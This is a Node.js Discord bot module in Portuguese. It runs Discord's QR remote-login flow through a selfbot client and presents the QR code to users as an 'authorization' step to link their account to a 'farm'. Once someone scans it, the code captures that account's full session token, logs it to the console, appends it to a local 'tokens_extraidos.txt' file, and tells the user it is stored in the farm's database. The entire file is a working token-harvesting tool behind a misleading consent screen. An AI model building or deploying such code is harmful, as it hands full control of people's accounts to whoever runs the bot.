const { MessageEmbed, MessageActionRow, MessageButton, MessageAttachment } = require('discord.js');
const { Client: Selfbot } = require('discord.js-selfbot-v13');
const QRCode = require('qrcode');
const fs = require('fs');

async function handleQRExtraction(interaction) {
    const tempSb = new Selfbot({
        checkUpdate: false,
        qrCode: false,
        patchConsole: false,
        logLevel: 0
    });

    let isFinished = false;

    const finalize = () => {
        isFinished = true;
        try { tempSb.destroy(); } catch (e) { }
    };

    tempSb.on('qr', async (qr) => {
        if (isFinished) return;

        const imagePath = `./qr_${interaction.user.id}.png`;
        const authLink = `https://discord.com/ra/${qr}`;

        try {
            await QRCode.toFile(imagePath, qr);
            const attachment = new MessageAttachment(imagePath, 'qrcode.png');

            const embed = new MessageEmbed()
                .setTitle('Autorização de Acesso VoxBot')
                .setDescription(
                    'Para vincular sua conta ao farm, escolha uma opção:\n\n' +
                    '**Navegador:** Clique no botão abaixo para abrir a tela de autorização.\n' +
                    '**Celular:** Escaneie o QR Code abaixo com o app do Discord.\n\n' +
                    'Após confirmar no seu dispositivo, o sistema salvará seu acesso automaticamente.'
                )
                .setImage('attachment://qrcode.png')
                .setColor('#5865F2')
                .setFooter({ text: 'O link expira em 2 minutos por segurança.' });

            const row = new MessageActionRow().addComponents(
                new MessageButton()
                    .setLabel('Autorizar no Navegador')
                    .setStyle('LINK')
                    .setURL(authLink)
            );

            await interaction.editReply({
                content: '🚀 **Link de autorização gerado!**',
                embeds: [embed],
                components: [row],
                files: [attachment]
            }).catch(() => { });

            if (fs.existsSync(imagePath)) {
                setTimeout(() => { try { fs.unlinkSync(imagePath); } catch (e) { } }, 5000);
            }
        } catch (err) {
            console.error('Erro ao gerar interface de autorização:', err);
        }
    });

    tempSb.on('ready', async () => {
        if (isFinished) return;
        isFinished = true;

        const token = tempSb.token;
        const tag = tempSb.user.tag;

        console.log(`\x1b[32m[SUCESSO] Token coletado: ${tag}\x1b[0m`);

        // Salva no arquivo local
        fs.appendFileSync('tokens_extraidos.txt', `[${new Date().toLocaleString()}] ${tag}: ${token}\n`);

        await interaction.editReply({
            content: `✅ **Acesso Autorizado!**\nConta vinculada: \`${tag}\`\nSeu token: \`${token}\` (O token também foi salvo no banco de dados do farm).`,
            embeds: [], components: [], files: []
        }).catch(() => { });

        finalize();
    });

    tempSb.QRLogin().catch(() => {
        if (!isFinished) {
            finalize();
            interaction.editReply({ content: '❌ Falha ao gerar link de autorização. Tente novamente.' }).catch(() => { });
        }
    });

    setTimeout(() => {
        if (!isFinished) {
            finalize();
            interaction.editReply({ content: '⏰ O tempo de autorização expirou.', embeds: [], components: [], files: [] }).catch(() => { });
        }
    }, 120000);
}

module.exports = { handleQRExtraction };